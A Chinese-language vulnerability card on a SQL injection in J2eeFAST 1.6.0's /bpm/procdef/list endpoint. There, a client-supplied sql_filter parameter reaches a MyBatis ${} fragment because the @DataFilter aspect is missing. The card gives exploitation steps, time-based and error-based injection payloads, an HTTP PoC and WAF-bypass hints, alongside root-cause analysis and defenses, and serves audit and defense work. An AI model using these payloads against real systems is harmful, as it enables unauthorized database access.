---
id: web-generic-sqli-j2eefast-sql-filter-procdef
title: J2eeFAST /bpm/procdef/list 的 sql_filter 未经过 DataFilter 切面：${sql_filter} 直接拼接导致 ORDER BY/WHERE 注入
type: scenario
domain: web
path: web/generic/sqli
technique: unguarded-sql-filter-param-injection
aliases:
- J2eeFAST SQL注入
- sql_filter 注入
- ProcdefController 注入
- DataFilter 切面绕过
- findPage ${sql_filter}
tags:
- sqli
- java
- mybatis
- sql-filter
- map-parameter
- spring-boot
- j2eefast
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V53
  verified_at: '2026-11-05T08:59:15+08:00'
  notes: 已对照原文及25张图核对：图06确认findUserByRolePage的${sql_filter}与@DataFilter清空对照；图13确认ProcessDefinitionMapper.findPage的<if test="sql_filter...">and ${sql_filter}</if>；图14-16确认ProcdefService.findPage无@DataFilter、Controller /bpm/procdef/list(@RequestParam Map)直接传params，图08/11/12确认@DataFilter切面map.put(SQL_FILTER,EMPTY)。核对时清除affected_versions：1.6.0仅为原文审计版本，非原文标注的受影响区间。未验证点：原文未展示实际注入请求/响应/时间差，卡内PoC为按代码路径构造；frontmatter无source_url；未本机复跑。
---

## 一句话结论

J2eeFAST 1.6.0 中，`/bpm/procdef/list` 接收 `Map<String,Object>` 参数并原样传给 `ProcdefService.findPage`，最终把 `params.get("sql_filter")` 作为 `${sql_filter}` 拼进 Mapper 的 `and ${sql_filter}`；该方法没有加 `@DataFilter` 切面（该切面会清空 `sql_filter`），因此拥有 `bpm:procdef:list` 权限的用户可注入任意 SQL 条件。

## 原理

- 实体/参数层：Controller `ProcdefController.list(@RequestParam Map<String, Object> params)` 把所有查询参数（包括文档中不存在的 `sql_filter`）放进 Map，直接调用 `procdefService.findPage(params)`。
- Service `findPage` 取出 `category`、`suspensionState`、`name`、`modelKey` 等正常参数，同时把 `(String) params.get(Constant.SQL_FILTER)` 作为独立参数传给 `processDefinitionMapper.findPage(...)`。
- Mapper `ProcessDefinitionMapper.xml` 的 `findPage` 中有：
  ```xml
  <if test="sql_filter != null and sql_filter != ''">
    and ${sql_filter}
  </if>
  ```
  `${}` 是文本替换，攻击者传入的字符串直接进入 `WHERE` 子句。
- 项目里另有 `findUserByRolePage` 等方法使用 `@DataFilter` 切面；`DataFilterAspect` 在方法执行前执行 `map.put(Constant.SQL_FILTER, StrUtil.EMPTY)`，把客户端传入的 `sql_filter` 清空，所以那些方法安全。`ProcdefService.findPage` 没有该注解，清空逻辑不会执行，形成“同一参数在部分接口安全、在另一接口可注入”的对照。
- 根因：把“数据权限过滤 SQL 片段”这种本应由服务端生成的字符串交给客户端参数控制，并依赖 AOP 注解来兜底；漏加注解的接口就暴露了 `${}` 拼接。

## 触发条件

- 目标为 J2eeFAST 1.6.0（原文测试版本）。
- 攻击者拥有 `bpm:procdef:list` 权限（流程定义列表查看权限）。
- `/bpm/procdef/list` 可达，且 `sql_filter` 未被网关/WAF 过滤。
- Mapper 中 `${sql_filter}` 的拼接上下文为 `and <payload>`，payload 需为合法布尔表达式。

## 利用步骤

1. 登录具备 `bpm:procdef:list` 权限的账号，访问 `/bpm/procdef/list` 确认正常返回流程定义列表。
2. 追加 `sql_filter` 参数，先用 `sql_filter=1=1` 观察返回结果是否变化，再用 `sql_filter=1=0` 对比。
3. 时间盲注确认：`sql_filter=1=1 AND (SELECT SLEEP(3))`，比较响应时间；报错注入可尝试 `1=1 AND extractvalue(1,concat(0x7e,database()))`。
4. 确认后按 MySQL 语法读取数据；注意 payload 前有 `and`，需保证整体 WHERE 语句合法。
5. 记录请求与响应差异/时间差作为证据；验证后停止。

## PoC

```http
GET /bpm/procdef/list?pageNum=1&pageSize=10&sql_filter=1=1%20AND%20(SELECT%20SLEEP(3)) HTTP/1.1
Host: target
Cookie: JSESSIONID=<有 bpm:procdef:list 权限的会话>
```

若响应时间稳定增加约 3 秒，说明 `${sql_filter}` 已进入 SQL 执行。原文仅跟踪代码路径并确认未加 `@DataFilter`，未展示实际注入响应/时间差截图。

## 变体与关联

- 变体：其他未加 `@DataFilter` 且把 `sql_filter` 传入 `${}` 的 Service/Mapper 组合同样可注入；审计时应逐个核对 `SQL_FILTER` 使用点是否在切面覆盖范围内。
- 变体：`sql_filter` 出现在 `ORDER BY`、`GROUP BY` 等不同上下文时，payload 语法需相应调整。
- 变体：若接口有 WAF，可用注释、大小写、编码、`/**/` 等绕过关键词检测；时间盲注通常比报错更稳。
- 关联：[[web-generic-sqli-mybatis-dollar-brace-injection]]（MyBatis `${}` 拼接的通用原理）。
- 关联：[[web-generic-sqli-bootdo-sort-order-token]]（Map 隐藏参数进入 `${}` 的另一实例）。

## 检测与防御

- 防御：`sql_filter` 这类数据权限片段只能由服务端生成（如 AOP 统一写入），绝不从请求参数读取；DTO/Map 接收时显式剔除该键。
- 防御：不要依赖“每个方法都记得加注解”；在统一入口/拦截器层清空或覆盖 `sql_filter`，或在 Mapper 层拒绝 `${sql_filter}`。
- 防御：所有数据权限 SQL 使用参数化或服务端白名单拼装；对 `IN`/`ORDER BY` 等动态片段使用固定枚举。
- 检测：审计 `SQL_FILTER`/`sql_filter` 的所有使用点，核对是否处于 `@DataFilter` 切面覆盖的方法内；搜索 `${sql_filter}`。
- 检测：请求中出现 `sql_filter` 参数（正常前端不应提交）；响应时间异常、SQL 报错、返回条数与查询条件不符。
